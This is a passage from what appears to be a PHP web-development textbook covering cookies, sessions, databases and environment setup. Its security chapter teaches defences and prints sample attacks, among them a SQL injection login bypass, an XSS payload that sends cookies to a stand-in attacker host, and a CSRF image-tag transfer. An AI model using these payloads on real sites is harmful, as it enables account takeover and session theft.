In the past, this kind of user tracking could be done based on the client’s IP address; with the popularisation of networks where several devices share a single public IP towards the rest of the Internet (NAT, Network Address Translation), that approach stopped being reliable, since requests from completely different users can reach the server with the same source IP address.
Two complementary solutions then emerged to maintain a session’s state between successive requests: cookies and sessions.

7.9.1 Cookies
A cookie is a small piece of information the server asks the browser to store, inserted into an HTTP response header, which the browser then automatically includes in every subsequent request to that same server, allowing it to recognise the client:
HTTP/1.1 200 OK
Set-Cookie: sessao=00b38b9a6f949a8df5476999c876789e; Path=/
In PHP, a cookie is created with the setcookie() function:
<?php
setcookie("utilizador", "joao", time() + 3600);
A cookie, by itself, does not amount to authentication: it only allows recognising that a request comes from the same browser that received it previously.






Note



The attributes that control a cookie’s validity, scope and security (Expires, Domain, Secure, HttpOnly, among others), as well as the standard that defines them, are detailed in Section E.5.




7.9.2 Sessions
Sessions go further than plain cookies: instead of storing the actual data on the client, visible and changeable by anyone with access to the browser, the server stores the data locally, associated with a unique identifier, and sends only that identifier to the client, typically through a cookie. In PHP, a session starts with session_start(), called at the beginning of every page that uses it, and its data is available through the $_SESSION superglobal:
<?php
session_start();
$_SESSION["utilizador"] = "joao";
<?php
// On another page, also with session_start() at the start:
session_start();
echo "Bem-vindo, " . $_SESSION["utilizador"];
Cookies and sessions are, therefore, the engineering solution that allows continuity to be simulated in a web application built on a protocol that, by nature, keeps no memory of anything between one request and the next.

title: 8  Databases and PHP
text:
8.1 Relational Databases and the DBMS
A DBMS (Database Management System) is the software that creates, organises and manages databases: it controls access, queries and updates, guarantees the integrity, security and performance of the data, and allows applications, such as those written in PHP, to read and write information persistently. Common examples of DBMS include MySQL, MariaDB, PostgreSQL, Oracle, SQL Server and SQLite.
In a relational database, such as MySQL, data is organised into tables, each with fixed-type columns, and rows that represent individual records. It is exactly this persistence that the $artigos array seen in Section 3.8.3 lacks: kept only in memory, that array resets every time the server restarts, and one reader never sees an article published by another server process. A database keeps information across different requests, and across different users — exactly what Tiago’s Contraponto site is missing to stop depending on data fixed in the code.

title: 9  Web Application Security
text:
9.1 Vulnerabilities in Custom Code
The most widely used reference for classifying web application vulnerabilities is the OWASP Top 10, a list of the most critical security risks, maintained by the Open Worldwide Application Security Project and periodically updated based on the analysis of tens of thousands of real vulnerabilities (OWASP Foundation 2026). Three of these vulnerabilities are particularly relevant to a PHP application like the ones developed in this course:

title: 9  Web Application Security
text:
9.1.1 SQL Injection
SQL Injection occurs when data supplied by the user is inserted directly into an SQL statement, allowing an attacker to change the meaning of that statement. Consider a login form implemented insecurely, through direct concatenation:
<?php
$utilizador = $_POST["utilizador"];
$password = $_POST["password"];

$sql = "SELECT * FROM utilizadores WHERE utilizador = '$utilizador' "
     . "AND password = '$password'";
$resultado = $conexao->query($sql);
If an attacker enters, in the utilizador field, the text ' OR '1'='1' --, the SQL statement actually executed becomes:
SELECT * FROM utilizadores
WHERE utilizador = '' OR '1'='1' -- ' AND password = '...'
Since '1'='1' is always true, and -- turns the rest of the line into an SQL comment, ignoring the password check, this query returns the first user in the table, allowing the attacker to log in without knowing any valid password. It is avoided by always using prepared statements, as seen in Section 8.7, which treat the content of $_POST always as a value, never as part of the SQL command, regardless of what that value contains.


9.1.2 XSS (Cross-Site Scripting)
XSS occurs when data supplied by a user is displayed to other users without being properly handled, allowing an attacker to inject JavaScript code that runs in the browser of whoever views that page. Consider a comment box that displays the submitted text directly:
<?php
echo "<p>" . $_POST["comentario"] . "</p>";
If an attacker submits, as a comment, the text <script>document.location='http://atacante.com/roubo?c='+document.cookie</script>, that JavaScript code becomes part of the page like any other, and is automatically executed in the browser of any other user who visits that page, potentially, for example, sending their session cookies to a server controlled by the attacker. It is avoided by always escaping user-generated content before displaying it in HTML, with the htmlspecialchars() function, which converts special HTML characters, such as < and >, into their harmless equivalents:
<?php
echo "<p>" . htmlspecialchars($_POST["comentario"]) . "</p>";
This way, the attacker’s text is shown literally on the page, as visible text, and is not interpreted as code.


9.1.3 CSRF (Cross-Site Request Forgery)
CSRF occurs when an attacker tricks the browser of an already-authenticated user into sending, without the user noticing, a request to an application where they have an active session, exploiting the fact that the browser automatically sends session cookies on any request to that domain, as seen in Section 7.9.1. Imagine a banking application with a transfer implemented as a simple GET request:
GET /transferir?destino=1234&valor=500
If a user, authenticated with that bank, visits, in another browser tab, a malicious page containing <img src="https://banco.com/transferir?destino=1234&valor=500">, the browser tries to load that “image”, automatically sending the request to the bank, along with the user’s valid session cookie, without the user having clicked anything. It is avoided in two complementary ways: never implement operations that change data as a simple GET, as already recommended in Section 7.4.3, and include, in every sensitive form, a unique, unpredictable token, generated by the server and verified before processing the request, which a malicious page, hosted on another domain, has no way of knowing or reproducing.
In all these cases, the underlying principle is the same: never trust data coming from the client, whether from a form, a URL parameter or a cookie, without first validating and handling it properly.

title: 9  Web Application Security
text:
9.2 Vulnerabilities in Third-Party Dependencies
The attack surface of a website is not limited to the code written directly by its programmer. Much of today’s Web is built on content management systems, such as WordPress, extended through third-party plugins, often developed by small teams or even a single independent programmer. According to Patchstack’s 2025 security report, 91% of the vulnerabilities found in the WordPress ecosystem that year were located in plugins, not in the WordPress core, and more than half of the recorded infections resulted from outdated plugins (Patchstack 2025).
This reality led the most recent update of the OWASP Top 10 to introduce a category dedicated to failures in the software supply chain (Software Supply Chain Failures), recognising that an application’s security also depends on the security of every library, framework and extension it relies on, not just the code written by the team itself (OWASP Foundation 2026). This is why, in practice, hosting providers sometimes suspend access to a website until its vulnerable dependencies are updated: the vulnerability may not be in a single line of code written by the site’s owner, but the risk it represents is just as real.

text:
10.1 Why Separate Responsibilities?
The mini CRUD application built in Section 8.9, with files such as index.php, add.php or edit.php, illustrates a very concrete problem well: in each of these files, the database query, the validation of received data and the HTML shown to the user are all mixed together in the same place. In a small application, with a single table, this is manageable. As an application grows, with more entities, more business rules and more pages, this coding style becomes increasingly hard to maintain: a simple change to a page’s visual appearance requires editing the same file that contains the data access logic, and an error in an SQL query can, without it being obvious why, also break the page’s presentation. This is exactly the problem the MVC pattern, presented in Section 2.1.2, solves, by separating the application into Model, View and Controller.

title: Appendix A — Development Environment Setup
text:
A.1 Introduction
This appendix describes, step by step, the setup of the development environment presented in Section 3.1, both via virtual machine and via containers. For each of these two approaches, there are two possible scenarios:
Neither of these descriptions replaces the concrete instructions that may be given in practical classes, which may specify different versions, network configurations or credentials from those used here as an example; the goal of this appendix is only to ensure that any student can, on their own, reach a working environment, with Apache, PHP and MySQL ready to use.

title: Appendix A — Development Environment Setup
text:
The lecturer provides a ready-made environment: a virtual machine already installed and configured, distributed as an .ova file, or a set of containers already defined, distributed as configuration files or as pre-built images. This is the most common scenario, and the only one most students need to follow.
The student builds the environment from scratch: installing and configuring Apache, MySQL and PHP themselves, or writing their own Dockerfile and docker-compose.yml. This is useful for anyone who wants to use the same environment on a personal computer outside the context of class, or who simply wants to understand, in detail, what the provided environment is made of.



A.1.1 Virtual Machine or Containers?
There are two possible approaches for this environment, both already introduced in Section 2.2.3:
Virtual machine: this is the default approach followed in this course, already presented in Section 2.2.4: a VirtualBox virtual machine with Ubuntu, where the Apache server, MySQL and PHP are installed, either individually or through a pre-configured package, depending on each student’s computer’s operating system. All development, from editing the code to testing it in the browser, happens inside this virtual machine, which behaves, for practical purposes, like a small server of its own, isolated from the rest of the computer.
Containers (Docker): an alternative is to use Docker to run Apache, PHP and MySQL each in its own container, instead of installing them inside a full virtual machine. This is a lighter option, with a faster startup, especially suited to those who already have some experience with Docker, or to a computer with fewer resources available to run an entire virtual machine.


A.1.2 What You Should End Up With
Whatever approach is chosen, and whether the environment is provided by the lecturer or built from scratch, the end result is the same:

A running Apache server, capable of interpreting PHP code;
A running MySQL server, accessible from PHP code;
A code editor, typically Visual Studio Code, with direct access to the project files;
The ability to open a .php file in a browser, through an address such as http://localhost, and see the result of its execution.

The following sections describe how to reach this result, either through an image provided by the lecturer (see Section A.2 and Section A.3), or by building the environment from scratch (see Section A.4).


A.1.3 Students’ Computer Operating Systems
Before downloading any software, it is important to know which of the following three variants matches each student’s computer, since both VirtualBox and Docker Desktop provide different installers for each one:

Windows;
macOS with an Intel processor (older Macs, from before 2020/2021);
macOS with Apple Silicon (Macs with an M1, M2, M3 or M4 processor, most models sold from 2020/2021 onward).

On a Mac, this information can be found in the Apple menu (the icon in the top-left corner of the screen), under About This Mac: if the Chip field shows Apple M1, M2, M3 or M4, it is Apple Silicon; if it shows Intel Processor, it is an Intel Mac. Choosing the wrong installer is one of the most common mistakes at this stage, and typically results in an application that does not open, or that opens but fails to start any virtual machine or container.


A.1.4 phpMyAdmin
phpMyAdmin is a free MySQL administration tool accessed through the browser, itself written in PHP. Instead of writing SQL statements on the command line to view a table’s contents, create a database, or check whether a row was correctly inserted, phpMyAdmin shows all of this in a visual interface, which makes it particularly useful while learning to work with databases. Neither the virtual machine nor the containers necessarily need to include it — MySQL works perfectly well without it — but, when available, it is often the fastest way to visually confirm that a PHP application is actually writing and reading the correct data. This appendix indicates, in each of the following four sections, how to access phpMyAdmin when it is provided by the lecturer, and how to install it when the environment is built from scratch.

title: Appendix A — Development Environment Setup
section: A.2 Virtual Machine Provided by the Lecturer
text:
A.2 Virtual Machine Provided by the Lecturer

A.2.1 Installing VirtualBox
The only software each student needs to install, in this scenario, is VirtualBox, available for free at virtualbox.org/wiki/Downloads, where separate installation packages appear depending on the computer’s operating system: Windows hosts, macOS / Intel hosts and macOS / Apple Silicon hosts, corresponding to the three variants described in Section A.1.3. The virtual machine itself, with Ubuntu and the entire development stack already installed and configured, is provided separately by the lecturer, as an .ova file.


A.2.2 Importing the .ova File
With VirtualBox installed and the .ova file provided by the lecturer saved on the computer, the steps to get it running are:

Open VirtualBox and choose File > Import Appliance... (or the shortcut Ctrl+I);
Select the provided .ova file;
Review the proposed settings for the virtual machine (name, RAM, number of processors, virtual disk location), which come pre-filled with the values used by the lecturer, and which can be adjusted, within each student’s computer’s limits, before proceeding;
Confirm the import and wait for VirtualBox to copy and unpack the contents of the .ova file, a process that can take several minutes, depending on the size of the virtual machine and disk speed;
Once the import is complete, select the virtual machine in the VirtualBox list and click Start.

The access credentials (username and password) inside the virtual machine, as well as the address and port where the application becomes accessible from the host computer’s browser (for example, http://localhost:8080, if the virtual machine uses port forwarding instead of direct access), are provided by the lecturer together with the .ova file, since they may vary from year to year.


A.2.3 First Tests
After the virtual machine starts, before beginning to program, it is worth confirming that everything is working as expected. In a terminal inside the virtual machine, check the version of each already-installed component:
php -v
apache2 -v
mysql --version
Next, test the connection to PHP through the browser: opening the address indicated by the lecturer (inside the virtual machine, typically http://localhost; from the host computer, depending on the virtual machine’s network configuration), a page served by Apache and processed by PHP should appear. Finally, test the connection to the database, either directly on the terminal:
mysql -u root -p
or through a small PHP script like the one presented in Section A.5, which confirms that PHP can actually communicate with MySQL, and not just that both services are, each on its own, running.
If the virtual machine provided by the lecturer also includes phpMyAdmin, a MySQL administration tool accessed through the browser, referred to in Section A.1.4, that is the simplest way to visually confirm that the database is accessible, without needing the command line: simply open http://localhost/phpmyadmin (or the address indicated by the lecturer) and authenticate with the MySQL credentials.

title: Appendix A — Development Environment Setup
section: A.3 Containers Provided by the Lecturer
text:
A.3 Containers Provided by the Lecturer

A.3.1 Installing Docker
As with the virtual machine option, the only software each student needs to install, in this scenario, is Docker. On Windows and macOS, Docker Desktop is installed, available at docker.com/products/docker-desktop, where, just as with VirtualBox, separate installers appear for Mac with Apple silicon and Mac with Intel chip, in addition to the Windows installer; on Linux, Docker Engine is installed directly, following the instructions at docs.docker.com/engine/install. The installation is confirmed, in a terminal on the host computer, with:
docker --version
docker compose version


A.3.2 Loading and Starting the Containers
The lecturer can distribute the environment in two different ways:

Configuration files (docker-compose.yml, and a Dockerfile if applicable): simply place them in a folder and run, from inside it:
docker compose up -d --build
Pre-built images, distributed as .tar files: in this case, start by loading each image into the local Docker, before starting it:
docker load -i apache-php-image.tar
docker load -i mysql-image.tar
docker compose up -d

In either case, the expected result is the same one referred to in Section A.1.1: one container with Apache and PHP, and another, separate, container with MySQL, both running and communicating with each other.


A.3.3 First Tests
With the containers running, first confirm that both are active:
docker ps
The list should show one container for Apache/PHP and another for MySQL, each with its own name. Then check the version installed in each one, running the command directly inside the container with docker exec:
docker exec -it <web_container_name> php -v
docker exec -it <db_container_name> mysql --version
Next, test the connection to PHP through the browser, at the address and port indicated by the lecturer (for example, http://localhost:8080), and finally, the connection to the database, either directly from the container:
docker exec -it <db_container_name> mysql -u root -p
or through the small PHP script presented in Section A.5, just as in the virtual machine scenario.
If the lecturer also includes a phpMyAdmin container, referred to in Section A.1.4, it is normally accessible at its own address (for example, http://localhost:8081), offering a visual way, through the browser, to confirm the database’s contents, without needing docker exec to enter the MySQL container.

title: Appendix A — Development Environment Setup
section: A.4 Building the Environment from Scratch
text:
A.4 Building the Environment from Scratch
The following two sections are for anyone who is not going to use the environment provided by the lecturer, and prefers to build, themselves, each of the two approaches described in Section 3.1, from installing VirtualBox or Docker all the way to Apache, MySQL and PHP being ready to use.

A.4.1 Option 1: Virtual Machine with VirtualBox

Creating the Virtual Machine

Install VirtualBox, as described in Section A.2.1;
Get an .iso image of Ubuntu, available at ubuntu.com/download (the Desktop version, simpler to use for beginners, or the Server version, lighter, for those who already have some command-line experience);
In VirtualBox, create a new virtual machine, specifying type Linux and version Ubuntu (64-bit);
Assign the virtual machine at least 4 GB of RAM, and a dynamically allocated virtual disk of at least 25 GB, to accommodate the operating system, the installed packages, and the projects developed throughout the course;
Attach the Ubuntu .iso image as boot media, and start the virtual machine to run the installer, specifying language and keyboard, and creating a user and password;
Once installation is complete, restart the virtual machine and install VirtualBox’s Guest Additions (available in VirtualBox’s own Devices menu), which improve graphics performance and later allow shared folders with the host computer to be configured.



Installing Apache, MySQL and PHP
With Ubuntu installed and running inside the virtual machine, open a terminal and update the list of available packages before installing anything:
sudo apt update && sudo apt upgrade -y
Then install the Apache web server:
sudo apt install apache2 -y
Confirm that Apache is running, and test, in the virtual machine’s own browser, the address http://localhost, which should show Apache’s default welcome page:
sudo systemctl status apache2
Then install MySQL, and run the security configuration wizard, which asks you to set an administrator password and remove insecure default settings:
sudo apt install mysql-server -y
sudo mysql_secure_installation
Finally, install PHP, together with the module that connects PHP to Apache, and the extension that allows PHP to communicate with MySQL:
sudo apt install php libapache2-mod-php php-mysql -y
sudo systemctl restart apache2
Restarting Apache at the end is necessary so that it recognises the installed PHP module, and correctly interprets .php files.


Testing the Installation
By default, Apache serves files stored in the /var/www/html folder. To confirm that PHP is correctly installed, create a small test file there:
echo "<?php phpinfo(); ?>" | sudo tee /var/www/html/info.php
Opening http://localhost/info.php in the browser should show a page with detailed information about the PHP installation, including its version and the list of active extensions, which should include mysqli. Once confirmed, this file should be deleted, since it exposes detailed server information that should not remain accessible outside a development environment:
sudo rm /var/www/html/info.php


Installing phpMyAdmin (Optional)
phpMyAdmin, referred to in Section A.1.4, is a MySQL administration tool accessed through the browser, useful mainly while learning, to quickly view a table’s contents without writing a single SQL statement. Install it with:
sudo apt install phpmyadmin -y
During installation, apt asks which web server to configure automatically: select apache2 with the space bar, and confirm with Tab and Enter. It also asks whether it should configure phpMyAdmin’s own database with dbconfig-common, to which you answer yes, setting a password for that internal configuration. Once installation is complete, phpMyAdmin is accessible at http://localhost/phpmyadmin, where you log in with the username and password already created in MySQL. If Apache is not configured automatically, it may be necessary to manually add the line Include /etc/phpmyadmin/apache.conf to its configuration, and restart it:
echo "Include /etc/phpmyadmin/apache.conf" | sudo tee -a /etc/apache2/apache2.conf
sudo systemctl restart apache2


Editing Code from the Host Computer
Working directly inside the virtual machine, in a text editor installed there, is possible, but not very comfortable. Two alternatives allow editing the code with Visual Studio Code (code.visualstudio.com/download) installed on the host computer, while keeping the files accessible to Apache inside the virtual machine:

Shared folder: in the virtual machine’s settings, in VirtualBox, it is possible to define a folder on the host computer as a shared folder, mounted inside Ubuntu. By editing the files in that folder from the host, changes become immediately visible inside the virtual machine;
Remote connection via SSH: by installing an SSH server inside the virtual machine (sudo apt install openssh-server), the Remote - SSH extension for Visual Studio Code, on the host computer, allows the virtual machine’s files to be opened and edited directly, as if they were on the computer itself.




A.4.2 Option 2: Containers with Docker

Defining the Services with Docker Compose
With Docker installed, as described in Section A.3.1, instead of installing Apache, PHP and MySQL manually, as in the previous option, the necessary containers and how they communicate with each other are described in a docker-compose.yml file, based on the official PHP image (hub.docker.com/_/php) and the official MySQL image (hub.docker.com/_/mysql). The official PHP image with Apache does not, by default, include the MySQL connection extension, so a small Dockerfile of its own is needed to add it:
# Dockerfile
FROM php:8.3-apache
RUN docker-php-ext-install mysqli pdo_mysql
# docker-compose.yml
services:
  web:
    build: .
    ports:
      - "8080:80"
    volumes:
      - ./src:/var/www/html

  db:
    image: mysql:8
    environment:
      MYSQL_ROOT_PASSWORD: root
      MYSQL_DATABASE: application
    ports:
      - "3306:3306"
    volumes:
      - db_data:/var/lib/mysql

volumes:
  db_data:
Note the line volumes: - ./src:/var/www/html in the web service: it directly links the src folder, on the host computer, to the folder where Apache serves files inside the container, which means any .php file created or edited in that folder, with Visual Studio Code running normally on the host, becomes immediately available to the server, without any additional sharing or remote connection.
With the Dockerfile and docker-compose.yml in the same folder, the containers are built and started with:
docker compose up -d --build
Apache, inside the web container, becomes accessible on the host computer at http://localhost:8080, and MySQL, inside the db container, becomes accessible at localhost, on port 3306, with user root and the password set in the MYSQL_ROOT_PASSWORD variable.


Adding phpMyAdmin (Optional)
phpMyAdmin, referred to in Section A.1.4, is also available as an official image on Docker Hub (hub.docker.com/_/phpmyadmin), simply by adding one more service to the same docker-compose.yml, linked to the db container through the PMA_HOST variable:
# docker-compose.yml (additional service)
  phpmyadmin:
    image: phpmyadmin:latest
    environment:
      PMA_HOST: db
    ports:
      - "8081:80"
    depends_on:
      - db
After restarting the containers with docker compose up -d, phpMyAdmin becomes accessible at http://localhost:8081, where you log in with user root and the password set in MYSQL_ROOT_PASSWORD. Unlike the virtual machine installation, there is no additional Apache configuration to do here, since phpMyAdmin runs in its own container, independent of the web container.


Editing Code from the Host Computer
Unlike the virtual machine option, this configuration already links the host’s src folder directly to the container, so it is enough to simply open that folder normally in Visual Studio Code, with no need for shared folders or a remote SSH connection. Optionally, the Dev Containers extension for Visual Studio Code also allows opening the editor itself “inside” the web container, with direct access to the tools installed there.
